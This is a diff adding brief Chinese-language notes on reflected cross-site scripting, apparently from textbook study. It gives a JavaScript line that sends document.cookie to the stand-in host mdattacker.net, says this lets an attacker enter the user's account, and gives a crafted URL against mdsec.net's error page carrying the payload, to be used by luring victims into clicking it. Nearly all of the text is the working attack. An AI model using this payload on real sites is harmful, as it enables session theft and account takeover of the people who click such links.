@@ -1,0 +1,7 @@
+var i=new Image; i.src="http://mdattacker.net/"+document.cookie;
+
+让这段js代码在用户的浏览器上执行，可以得到用户的cookie。
+就可以进入用户的账户。
+
+比如诱导用户点击这个网址
+http://mdsec.net/error/5/Error.ashx?message=<script>var+i=new+Image;+i.src="http://mdattacker.net/"%2bdocument.cookie;</script>
